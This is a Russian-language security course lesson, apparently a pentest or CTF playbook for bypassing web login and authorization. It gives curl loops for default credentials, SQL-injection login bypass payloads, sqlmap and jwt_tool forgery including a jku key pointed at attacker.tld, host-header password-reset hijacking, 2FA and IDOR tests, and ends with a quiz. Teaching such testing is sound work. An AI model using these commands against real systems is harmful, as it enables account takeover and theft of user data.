---
id: web-playbook-auth-bypass
title: "Плейбук: обход аутентификации и авторизации"
category: web
parent: web-playbooks-exploit
difficulty: hard
order: 1
tags: [playbook, auth, jwt, session, idor, password-reset, 2fa, decision-tree, web]
prerequisites: [web-auth-core, web-auth-jwt-idor, web-playbook-recon-to-foothold]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 36
summary: "Упорядоченное decision-tree от «нашёл форму логина» до доступа: дефолтные креды → SQLi-обход → JWT → сессии → сброс пароля → 2FA → IDOR."
---

Форма логина или админ-панель — это точка входа, а не тупик. Вопрос всегда один: **в каком порядке пробовать обход, чтобы не потратить часы на брутфорс, когда рядом лежит дефолтный `admin:admin` или подделываемый JWT.** Этот плейбук задаёт порядок веток: от самых дешёвых (дефолтные креды) к более сложным (JWT-подделка, гонки в сбросе пароля, IDOR).

## Дерево решения (общая карта)

```
[форма логина / админ-панель / токен]
   │
   ├─(1) ДЕФОЛТНЫЕ и ТИПОВЫЕ креды + username enumeration
   │      │  admin:admin, admin:password, guest, демо-аккаунты
   │      └─ сработало ──► [доступ] ──► (7) эскалация привилегий
   │
   ├─(2) SQLi-ОБХОД логина (' OR 1=1-- -)
   │      └─ ошибка/обход ──► [доступ] + возможен дамп юзеров
   │
   ├─(3) ТОКЕНЫ: JWT / opaque
   │      ├─ JWT: alg=none, alg-confusion, слабый секрет, jku/jwk
   │      └─ opaque: фиксация, предсказуемость, отсутствие ротации
   │
   ├─(4) СЕССИИ: фиксация, отсутствие logout, cookie без HttpOnly/SameSite
   │
   ├─(5) СБРОС ПАРОЛЯ: предсказуемый токен, host header injection, гонка
   │
   ├─(6) 2FA: перебор кода, отсутствие лимита, обход «доверенного» потока
   │
   └─(7) АВТОРИЗАЦИЯ: IDOR, вертикальная/горизонтальная эскалация, mass assignment
          │
          └─► [чужой аккаунт / админка / данные]
```

## Шаг 1. Дефолтные и типовые креды + enumeration

Самая дешёвая ветка — начинать всегда с неё. Никогда не начинайте с `rockyou` на живой сервис.

```bash
# Дефолтные пары и типовые (маленький курируемый список, НЕ миллион строк)
for c in admin:admin admin:password admin:admin123 root:root \
         administrator:administrator guest:guest test:test user:user; do
  u=${c%%:*}; p=${c##*:}
  code=$(curl -s -o /dev/null -w '%{http_code}' -u "$u:$p" https://target.tld/admin/)
  echo "$c -> $code"
done

# Форма логина: один POST, смотрим на текст ошибки и на редирект
curl -s -i -c /tmp/cj.txt -d 'username=admin&password=admin' https://target.tld/login | head -20

# Enumeration: разный ответ на существующего/несуществующего пользователя
curl -s -o /dev/null -w '%{size_download}\n' -d 'username=admin&password=x' https://target.tld/login
curl -s -o /dev/null -w '%{size_download}\n' -d 'username=nosuchuser_zz&password=x' https://target.tld/login
```

**Условие ветвления:** есть демо/тестовый аккаунт или дефолт → вошли, идите в шаг 7 (эскалация). Разная реакция на существующего пользователя → у вас валидный список логинов для шага 2/5.

## Шаг 2. SQLi-обход логина

Если форма конкатенирует SQL, кавычка даст ошибку, а логические тавтологии — обход.

```bash
# Типовые обходы (по одному, смотрим на редирект/размер/ошибку)
for p in "' OR '1'='1'-- -" "admin'-- -" "' OR 1=1 LIMIT 1-- -" \
         "') OR ('1'='1'-- -" "' OR '1'='1'/*" '" OR "1"="1"-- -'; do
  echo "== $p"
  curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download}\n' \
    --data-urlencode "username=admin" --data-urlencode "password=$p" https://target.tld/login
done

# Если подозрение на инъекцию — передайте запрос sqlmap
sqlmap -r login.req --batch --level 3 --risk 2 -p username,password --dbms=mysql
```

**Условие ветвления:** обход сработал → вы в приложении под первым пользователем из запроса; далее дамп юзеров и шаг 7. Не сработал, но ошибки SQL видны → это всё ещё SQLi-точка, идите в `web-playbook-injection-triage`.

## Шаг 3. Токены: JWT и opaque

Токен в cookie/заголовке — второй по частоте путь. Для JWT есть отдельный урок `web-tool-jwt-tools`; здесь — порядок проверок.

```bash
# Декодировать JWT (header.payload.signature)
jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.XXXX

# 1) alg=none
jwt_tool <token> -X a            # попробовать none-алгоритм

# 2) alg-confusion (RS256 -> HS256 с публичным ключом как секретом)
jwt_tool <token> -X k -pk pub.pem

# 3) слабый HMAC-секрет (офлайн, по словарю)
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# 4) jku/jwk injection: подсунуть свой ключ
jwt_tool <token> -X s -ju https://attacker.tld/jwks.json
```

**Условие ветвления:** подделали токен (none/слабый секрет/подмена ключа) → установите его и смените claim (`uid`, `role`, `sub`) на жертву/админа → шаг 7. Не подделали → проверьте, не проверяется ли подпись вообще (поменяйте байт в payload и посмотрите, примут ли).

## Шаг 4. Сессии: фиксация и слабые cookie

```bash
# Атрибуты cookie
curl -sI https://target.tld/login | grep -i set-cookie
#   ищем: HttpOnly, Secure, SameSite, длину и «случайность» значения

# Фиксация сессии: до логина и после — тот же ID?
curl -s -c /tmp/pre.txt https://target.tld/ -o /dev/null
curl -s -b /tmp/pre.txt -c /tmp/post.txt -d 'username=u&password=p' https://target.tld/login -o /dev/null
diff <(cut -f6,7 /tmp/pre.txt) <(cut -f6,7 /tmp/post.txt)

# Проверка «logout»: инвалидируется ли серверная сессия
curl -s -b "session=$S" https://target.tld/logout -o /dev/null
curl -s -b "session=$S" https://target.tld/account -o /dev/null -w 'after-logout=%{http_code}\n'
```

**Условие ветвления:** ID сессии не меняется после логина (фиксация) → можно подготовить сессию для жертвы. Cookie без `HttpOnly` → возможен угон через XSS (`web-xss`). «Logout» не инвалидирует → украденная сессия живёт вечно.

## Шаг 5. Сброс пароля

Часто самый слабый канал: токен предсказуем, письмо уходит на подконтрольный хост, либо токен не привязан к пользователю.

```bash
# 1) Запрос сброса и анализ письма/ответа
curl -s -i -d 'email=victim@target.tld' https://target.tld/forgot | head -30

# 2) Host header injection: уйдёт ли ссылка на ваш хост
curl -s -i -d 'email=victim@target.tld' -H 'Host: attacker.tld' \
  https://target.tld/forgot | grep -i 'location\|reset\|token'

# 3) Предсказуемость токена: два сброса подряд, сравнить токены
curl -s -d 'email=a@target.tld' https://target.tld/forgot
curl -s -d 'email=a@target.tld' https://target.tld/forgot
#   анализируем: инкремент, timestamp, base64 от email, короткий hex

# 4) Гонка: отправить два запроса сброса параллельно на один аккаунт
for i in 1 2; do curl -s -d 'email=victim@target.tld' https://target.tld/forgot & done; wait
```

**Условие ветвления:** токен предсказуем или ушёл на ваш host → перехватываете сброс → задаёте свой пароль → вход под жертвой. Не вышло → проверьте, можно ли задать `email`/`user_id` другого пользователя напрямую (IDOR в сбросе).

## Шаг 6. 2FA

```bash
# Нет лимита попыток? (осторожно: НЕ брутить 000000-999999 — это lockout/DoS)
for code in 000000 111111 123456 000001 100000; do
  curl -s -o /dev/null -w "$code -> %{http_code}\n" \
    -b "session=$S" -d "otp=$code" https://target.tld/2fa/verify
done

# Обход: пропуск шага 2FA прямым переходом на внутреннюю страницу
curl -s -b "session=$S" https://target.tld/dashboard -o /dev/null -w '%{http_code}\n'

# Обход: ответ на 2FA принимается по одному и тому же сессионному ключу? (проверка привязки)
```

**Условие ветвления:** внутренние страницы открываются без 2FA → проверка не на сервере, обход тривиален. Нет лимита попыток → сообщите как отдельную находку (rate-limit), но **не** перебирайте миллион вариантов на живой цели.

## Шаг 7. Авторизация: IDOR и эскалация

Аутентификация пройдена — начинается самое частое: **приложение не проверяет, что объект принадлежит вам**.

```bash
# Горизонтальный IDOR: сменить id на чужой
curl -s -b "session=$S" https://target.tld/api/orders/1001 | jq .
curl -s -b "session=$S" https://target.tld/api/orders/1002 | jq .     # чужой заказ?

# Вертикальный: достучаться до админского API обычным токеном
curl -s -b "session=$S" https://target.tld/api/admin/users -o /dev/null -w '%{http_code}\n'

# Mass assignment: добавить лишнее поле
curl -s -b "session=$S" -H 'Content-Type: application/json' \
  -d '{"name":"me","role":"admin","isAdmin":true}' https://target.tld/api/me | jq .
```

**Условие ветвления:** получили чужой объект или админ-функцию → подтверждённый IDOR/privesc, фиксируйте доказательство (чужой `user_id` в ответе). Только `403` → вернитесь на шаг 3/4, возможно нужен другой токен/роль.

## Если не сработало — пробуй это

- **Всё возвращает 200, но это страница логина.** Проверяйте не код, а наличие чувствительного контента (`jq .id`, grep по имени пользователя).
- **Брутфорс даёт только «слишком много попыток».** Это и есть находка (нет нормального lockout/rate-limit). Не долбите дальше — переходите на другие ветки.
- **JWT не подделывается.** Проверьте `kid` (path traversal/SQLi в kid), `jku`/`x5u` (загрузка вашего ключа), отсутствие проверки `aud`/`iss`.
- **OAuth/OIDC вместо пароля.** Смотрите `web-oauth-oidc-saml`, `web-sso-mixup`, `web-oauth-device-code` — там `redirect_uri` и mix-up.
- **Есть регистрация.** Пробуйте занять `admin`/`support`, дубликаты email с разным регистром/Unicode, self-XSS в профиле, приглашения в организацию.
- **Пароль в ответе API.** Иногда `GET /api/me` возвращает `password_hash` или `api_key` — ищите такие утечки.

## Тупики (dead ends)

- Онлайн-брутфорс большого словаря по сети — дорого, шумно, часто с локом. Только маленький курируемый набор + офлайн-крекинг хешей.
- Пытаться подделать **opaque**-токен без понимания формата — сначала соберите несколько и сравните.
- Игнорировать rate-limit как находку — отсутствие лимита само по себе уязвимость.
- Ковырять фронтенд-валидацию (`disabled`, JS-проверки) вместо сервера — обход делается серверным запросом.
- Трактовать `200 OK` как «доступ есть» без проверки, что вернулись чужие данные.

## Квиз

```quiz
- question: "С чего начинать при находке панели логина?"
  options:
    - "С полного брутфорса rockyou"
    - "С дефолтных и типовых кредов + enumeration пользователей"
    - "С SSRF"
    - "С подделки JWT, даже если JWT нет"
  answer: 1
  explanation: "Сначала проверяют дешёвые ветки: дефолтные креды и перечисление пользователей."
- question: "Какой payload классически обходит конкатенирующий SQL-логин?"
  options:
    - "<script>alert(1)</script>"
    - "' OR '1'='1'-- -"
    - "../../etc/passwd"
    - "{{7*7}}"
  answer: 1
  explanation: "Логическая тавтология в кавычках обходит проверку пароля при конкатенации SQL."
- question: "Токен с заголовком alg=RS256, а вы подставляете HS256 с публичным ключом как секретом. Как это называется?"
  options:
    - "Фиксация сессии"
    - "Algorithm confusion (alg-confusion)"
    - "CSRF"
    - "Mass assignment"
  answer: 1
  explanation: "Подмена RS256 на HS256 с публичным ключом — классический algorithm confusion."
- question: "Сервер отдаёт 200 на чужой /api/orders/1002. Что нужно проверить, прежде чем заявить IDOR?"
  options:
    - "Что в ответе действительно данные ДРУГОГО пользователя"
    - "Что ответ быстрый"
    - "Что стоит заголовок Content-Type"
    - "Что сервер на nginx"
  answer: 0
  explanation: "IDOR подтверждается только чужими данными в ответе, а не кодом 200."
- question: "Форма сброса пароля принимает произвольный Host. Чем это опасно?"
  options:
    - "Ничем"
    - "Ссылка с токеном сброса может уйти на подконтрольный атакующему хост"
    - "Ломается вёрстка"
    - "Сервер перезагрузится"
  answer: 1
  explanation: "Host header injection уводит ссылку с токеном сброса на чужой домен."
```

## Где пригодится

- **CTF (Web):** быстро перебрать ветки обхода аутентификации под таймером.
- **Bug bounty:** приоритизация дешёвых веток и корректное подтверждение IDOR/токенов.
- **Пентест:** единый маршрут по auth/authz с доказательствами для отчёта.
- **Работа (AppSec):** понимание, где чаще всего ломается сессия, JWT и сброс пароля.
